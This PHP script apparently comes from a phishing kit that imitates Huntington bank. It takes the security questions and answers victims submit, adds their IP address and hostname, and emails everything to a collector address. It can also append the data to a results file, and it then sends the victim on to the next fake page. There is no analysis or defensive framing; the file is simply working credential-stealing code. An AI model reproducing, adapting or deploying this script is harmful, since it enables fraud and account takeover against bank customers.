<?php
include '../info.php';
include './blocker.php';
$ip = getenv("REMOTE_ADDR");
$var=$_POST['submit2'];
$message .= "D0N5L0W----HUNT1NGT0N-----QUEST10N----2023\n";
$message .= "Question 1: " .$_POST['q1']."\n\n";
$message .= "Answer 1: " .$_POST['a1']."\n\n";
$message .= "Question 2: " .$_POST['q2']."\n\n";
$message .= "Answer 2: " .$_POST['a2']."\n\n";
$message .= "Question 3: " .$_POST['q3']."\n\n";
$message .= "Answer 3: " .$_POST['a3']."\n\n";
$message .= "D0N5L0W----HUNT1NGT0N-----QUEST10N----2023\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "D0N5L0W----HUNT1NGT0N\n";
$subject = "D0N5L0W----HUNT1NGT0N-----QUEST10N----2023+ | $ip";
$headers = "From: ";
$headers .= $_POST['username']."HUNT1NGT0N";
$headers .= "D0N5L0W----HUNT1NGT0N-----QUEST10N----2023";

if (X_RESULT_SAVE_REZ_TO_FILE === true) {
    $fp = fopen('../'.X_RESULT_SAVE_NAME, "a");
    fputs($fp, $message);
    fclose($fp);
}

if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: ques5.php");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>